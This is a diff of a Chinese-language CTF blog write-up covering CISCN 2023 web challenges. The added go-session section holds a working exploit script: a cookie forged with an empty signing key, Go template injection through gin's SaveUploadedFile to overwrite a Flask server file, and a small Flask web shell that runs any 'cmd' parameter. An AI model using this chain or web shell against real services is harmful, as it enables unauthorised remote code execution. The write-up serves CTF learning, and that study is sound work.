@@ -2,46 +2,58 @@
 <html lang=en>
 <head>
     <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！  unzipunzip 分析成功 随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache  分析一下代码  1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; f">
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！  unzipunzip: 分析成功 随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache  分析一下代码  1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ciscn23初赛">
 <meta property="og:url" content="https://kc1zs4.github.io/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/index.html">
 <meta property="og:site_name" content="KC1zs4&#39;s Blog">
-<meta property="og:description" content="wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！  unzipunzip 分析成功 随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache  分析一下代码  1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D; f">
+<meta property="og:description" content="wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！  unzipunzip: 分析成功 随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache  分析一下代码  1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo &#x3D;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/ciscn23%E5%88%9D%E8%B5%9B/flask_error.png">
 <meta property="article:published_time" content="2024-11-14T11:03:43.153Z">
-<meta property="article:modified_time" content="2024-11-15T06:03:49.568Z">
+<meta property="article:modified_time" content="2024-12-13T07:24:26.432Z">
 <meta property="article:tag" content="recurrence">
 <meta name="twitter:card" content="summary">
-    
-    
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/ciscn23%E5%88%9D%E8%B5%9B/flask_error.png">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
       
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
     <!-- title -->
     <title>ciscn23初赛</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
 
-    <!-- Umami Analytics -->
+ <!-- Umami Analytics -->
 
 
     <!-- styles -->
@@ -51,10 +63,9 @@
     <!-- persian styles -->
     
     <!-- rss -->
+     
+    <!-- mathjax -->
     
-    
-	<!-- mathjax -->
-	
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -68,8 +79,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -118,7 +127,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">1.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E5%88%86%E6%9E%90%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.</span> <span class="toc-text">unzip 分析成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">unzip 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">zip手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">zip深入理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-slip"><span class="toc-number">1.3.2.</span> <span class="toc-text">zip slip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.3.3.</span> <span class="toc-text">zip目录穿越</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-number">2.</span> <span class="toc-text">deserbug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deserbug-%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">deserbug 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">3.</span> <span class="toc-text">go-session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E5%88%86%E6%9E%90%E5%A4%B1%E8%B4%A5"><span class="toc-number">3.1.</span> <span class="toc-text">go-session 分析失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.</span> <span class="toc-text">go-session总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">1.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E5%88%86%E6%9E%90%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.</span> <span class="toc-text">unzip: 分析成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">unzip: 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">zip手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">zip深入理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-slip"><span class="toc-number">1.3.2.</span> <span class="toc-text">zip slip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.3.3.</span> <span class="toc-text">zip目录穿越</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-number">2.</span> <span class="toc-text">deserbug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">3.</span> <span class="toc-text">go-session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E5%88%86%E6%9E%90%E5%A4%B1%E8%B4%A5"><span class="toc-number">3.1.</span> <span class="toc-text">go-session 分析失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E4%BA%8C%E6%88%98"><span class="toc-number">3.2.</span> <span class="toc-text">go-session: 二战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">go-session总结</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -171,7 +180,7 @@
     <blockquote>
 <p>wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！</p>
 </blockquote>
-<h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><h3 id="unzip-分析成功"><a href="#unzip-分析成功" class="headerlink" title="unzip 分析成功"></a>unzip 分析成功</h3><ol>
+<h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><h3 id="unzip-分析成功"><a href="#unzip-分析成功" class="headerlink" title="unzip: 分析成功"></a>unzip: 分析成功</h3><ol>
 <li><p>随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache</p>
 </li>
 <li><p>分析一下代码</p>
@@ -212,7 +221,7 @@
 <li><p>试试吧，不行再来本地，通了，nice：还是要抓住本质</p>
 </li>
 </ol>
-<h3 id="unzip-总结"><a href="#unzip-总结" class="headerlink" title="unzip 总结"></a>unzip 总结</h3><blockquote>
+<h3 id="unzip-总结"><a href="#unzip-总结" class="headerlink" title="unzip: 总结"></a>unzip: 总结</h3><blockquote>
 <p>虽然是web签到题，但是还是不容易啊，至少养成的思维是正确的</p>
 </blockquote>
 <ol>
@@ -228,7 +237,7 @@
 <h4 id="zip深入理解"><a href="#zip深入理解" class="headerlink" title="zip深入理解"></a>zip深入理解</h4><h4 id="zip-slip"><a href="#zip-slip" class="headerlink" title="zip slip"></a>zip slip</h4><h4 id="zip目录穿越"><a href="#zip目录穿越" class="headerlink" title="zip目录穿越"></a>zip目录穿越</h4><h2 id="deserbug"><a href="#deserbug" class="headerlink" title="deserbug"></a>deserbug</h2><blockquote>
 <p>裂开了，java还没咋学啊，看来这个月得来攻击java了(还有期末考sad</p>
 </blockquote>
-<h3 id="deserbug-分析"><a href="#deserbug-分析" class="headerlink" title="deserbug 分析"></a>deserbug 分析</h3><h2 id="go-session"><a href="#go-session" class="headerlink" title="go-session"></a>go-session</h2><h3 id="go-session-分析失败"><a href="#go-session-分析失败" class="headerlink" title="go-session 分析失败"></a>go-session 分析失败</h3><ol>
+<h2 id="go-session"><a href="#go-session" class="headerlink" title="go-session"></a>go-session</h2><h3 id="go-session-分析失败"><a href="#go-session-分析失败" class="headerlink" title="go-session 分析失败"></a>go-session 分析失败</h3><ol>
 <li>分析一下代码<ol>
 <li>首先肯定是要session伪造，可知这里使用的seesion包是github.com&#x2F;gorilla&#x2F;sessions</li>
 <li>其次在&#x2F;flask下可以获取更多信息<ol>
@@ -249,12 +258,65 @@
 </li>
 <li>所以下一步应该是ssrf打到flask里面去，因为只有这一个入口点了，前面报错有flask的一部分源码，ssrf没有目标入口啊？？？</li>
 </ol>
+<h3 id="go-session-二战"><a href="#go-session-二战" class="headerlink" title="go-session: 二战"></a>go-session: 二战</h3><blockquote>
+<p>一个月前看了这道题后一直没有再继续写，现在重新来学习一下，看看复现了24后能不能干一下23的</p>
+</blockquote>
+<ol>
+<li><p>升级一波源码，有session伪造+ssti+ssrf，ssrf的应用跑在5000上，结合flask应该是flask？</p>
+</li>
+<li><p>第一步还是session伪造</p>
+<ol>
+<li>github.com&#x2F;gorilla&#x2F;sessions用到这个，还有SESSION_KEY，看样子拿不到，ai一下，说是会对数据进行签名防止篡改，用到就是这个session_key</li>
+<li>爆破&#x2F;原有漏洞&#x2F;是弱爆破&#x2F;空&#x2F;像rsa公钥一样两个加密出公钥的？版本github.com&#x2F;gorilla&#x2F;sessions v1.2.1，没事爆破跑一下看看，还要配go环境，出了，<strong>密钥为空</strong></li>
+</ol>
+</li>
+<li><p>接下来可以可有做到模板注入了，终点应该在flask那里，这里要通过go的ssti来攻击flask</p>
+</li>
+<li><p>ai和查了一波，函数需要注册，只能拿使用gin.Context中的对象函数</p>
+<ol>
+<li>能不能直接搞文件的，查查文档和源码<ol>
+<li>File 可以读文件系统上的文件</li>
+<li>SaveUploadedFile 可以将文件存入指定目录中，但是权限是750，文件所有者可以写入，而同组用户和其他用户只能读取和执行，还可以</li>
+</ol>
+</li>
+<li>但是这里过滤了字符串，所以需要进行绕过，思路是通过参数传参，现在使用上有一个问题，就是返回回来的是数组，思路是通过遍历把值先存下来，有点麻烦，发现其实可以直接.0访问的，也算是gin(flask)的特性？</li>
+</ol>
+</li>
+<li><p>最终构造payload，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://b6bd1c73-f1aa-4eac-a3b8-3cfdd286a744.challenge.ctf.show&quot;</span></span><br><span class="line">route1=<span class="string">&quot;&quot;</span></span><br><span class="line">route2=<span class="string">&quot;/admin&quot;</span></span><br><span class="line">route3=<span class="string">&quot;/flask&quot;</span></span><br><span class="line"><span class="comment"># 我的bp</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;session-name&#x27;</span>,<span class="string">&#x27;MTczNDA1MjY1MHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwJpiQeYXo_ua97V-bC9mZdIN88JtK84esq9YEmUYwJ3Q==&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # poc failed：读取文件</span></span><br><span class="line"><span class="comment"># r = session.get(host+route2,timeout=5,params=&#123;</span></span><br><span class="line"><span class="comment">#     &quot;name&quot;: &quot;&#123;&#123;c.File(c.Request.URL.Query.File.0)&#125;&#125;&quot;,</span></span><br><span class="line"><span class="comment">#     &quot;File&quot;: &quot;/app/server.py&quot;,</span></span><br><span class="line"><span class="comment"># &#125;,proxies=proxies)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # poc：上传文件</span></span><br><span class="line">upload = &#123;</span><br><span class="line">    <span class="string">&quot;server.py&quot;</span>: (<span class="string">&quot;server.py&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;/home/kc1zs4/Code/CTF/server.py&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;multipart/form-data&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line">r = session.get(host+route2,timeout=<span class="number">5</span>,proxies=proxies,</span><br><span class="line">                 params=&#123;</span><br><span class="line">                     <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&#123;&#123;c.Request.URL.Query.File.0&#125;&#125;&#123;&#123;c.Request.Query.Dir.0&#125;&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.URL.Query.File.0),c.Request.URL.Query.Dir.0)&#125;&#125;&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;File&quot;</span>: <span class="string">&quot;server.py&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Dir&quot;</span>: <span class="string">&quot;/app/server.py&quot;</span>,</span><br><span class="line">                 &#125;,</span><br><span class="line">                 files=upload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # poc：flask服务</span></span><br><span class="line">params = <span class="string">&quot;?name=?cmd=cat$&#123;IFS&#125;/th1s_1s_f13g&quot;</span></span><br><span class="line"><span class="comment"># params = &quot;?name=guest&quot;</span></span><br><span class="line">r = session.get(host+route3+params,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server.py 名称最好保持一样</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd = flask.request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, KC1zs4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
 <h3 id="go-session总结"><a href="#go-session总结" class="headerlink" title="go-session总结"></a>go-session总结</h3><ol>
-<li><em><strong>对于可以直接生成的东西不要一直揪着不放，想清楚一点你要什么，比如这里的NewCookieStore()的签名算法</strong></em>，知道一个签名一个加密就ok，总之后续可以直接调用函数来生成</li>
+<li>session签名：对于可以直接生成的东西不要一直揪着不放，想清楚一点你要什么，比如这里的NewCookieStore()的签名算法，知道一个签名一个加密就ok，总之后续可以直接调用函数来生成，这里主要是签名，<strong>抽象一下我们就只需要绕过密钥这一环节，考虑弱&#x2F;无</strong></li>
+<li>有参函数调用：再模板处我们的思路是通过文件操作来实现控制，但是首先需要可以控制参数，我的做法是通过参数数组下标访问，看了一些题解还有一些方法可以实现</li>
+<li>debug模式利用：一个获取网站更多信息的情况是debug模式，而且python flask的**debug模式支持热加载(这是重点)**，这里可以结合已有的ssrf来进行覆写访问恶意服务，要有报错的意识<img src="/pic/ciscn23%E5%88%9D%E8%B5%9B/flask_error.png" alt="pic"><ol>
+<li>ssrf一下，这里可以的到目录是&#x2F;app&#x2F;server.py，这里没法算pin，因为要任意读文件这里不满足</li>
+</ol>
+</li>
+<li><strong>文件覆写gin利用</strong>：找到函数SaveUploadedFile，可以存入到指定目录，要指定multi-part才可以</li>
+<li><strong>Q：为什么c.File()一直不可行？</strong><ol>
+<li>A：可能是不出网感觉，gpt是说涉及到http不行<ol>
+<li>上下文不一致：Gin 的 c.File 方法需要 *gin.Context，而模板渲染的上下文是 HTML 模板引擎的上下文。它们是不同的上下文，不能互换使用。</li>
+<li>方法返回值要求：在模板中调用 Go 函数时，模板引擎要求函数返回值类型是特定的（通常是一个值和一个错误）。c.File 方法没有返回适合在模板中使用的值类型，这会导致错误。</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><strong>Q：一开始发包时为什么总是会显示301？</strong><ol>
+<li>A：可能是路由形式的不一定，如果修改admin&#x2F;到&#x2F;admin就可以了，**&#x2F;这个符号还是很重要的**，可以在别的地方发包看看</li>
+</ol>
+</li>
 </ol>
 
   </div>
 </article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
 
 
 
@@ -266,8 +328,6 @@
       <ul>
         
           <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About</a></li>
         
           <li><a href="/archives/">Writing</a></li>
         
@@ -283,7 +343,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">1.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E5%88%86%E6%9E%90%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.</span> <span class="toc-text">unzip 分析成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">unzip 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">zip手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">zip深入理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-slip"><span class="toc-number">1.3.2.</span> <span class="toc-text">zip slip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.3.3.</span> <span class="toc-text">zip目录穿越</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-number">2.</span> <span class="toc-text">deserbug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deserbug-%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">deserbug 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">3.</span> <span class="toc-text">go-session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E5%88%86%E6%9E%90%E5%A4%B1%E8%B4%A5"><span class="toc-number">3.1.</span> <span class="toc-text">go-session 分析失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.</span> <span class="toc-text">go-session总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">1.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E5%88%86%E6%9E%90%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.</span> <span class="toc-text">unzip: 分析成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unzip-%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">unzip: 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">zip手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">zip深入理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip-slip"><span class="toc-number">1.3.2.</span> <span class="toc-text">zip slip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.3.3.</span> <span class="toc-text">zip目录穿越</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-number">2.</span> <span class="toc-text">deserbug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-number">3.</span> <span class="toc-text">go-session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E5%88%86%E6%9E%90%E5%A4%B1%E8%B4%A5"><span class="toc-number">3.1.</span> <span class="toc-text">go-session 分析失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session-%E4%BA%8C%E6%88%98"><span class="toc-number">3.2.</span> <span class="toc-text">go-session: 二战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-session%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">go-session总结</span></a></li></ol></li></ol>
       </div>
     
 
@@ -322,7 +382,7 @@
     Copyright &copy;
     
     
-    2023-2024
+    2023-2025
     KC1zs4&#39;s Blog
   </div>
   <div class="footer-right">
@@ -330,8 +390,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -435,6 +493,18 @@
 <!-- Cloudflare Analytics -->
 
 <!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
 <!-- utterances Comments -->
 
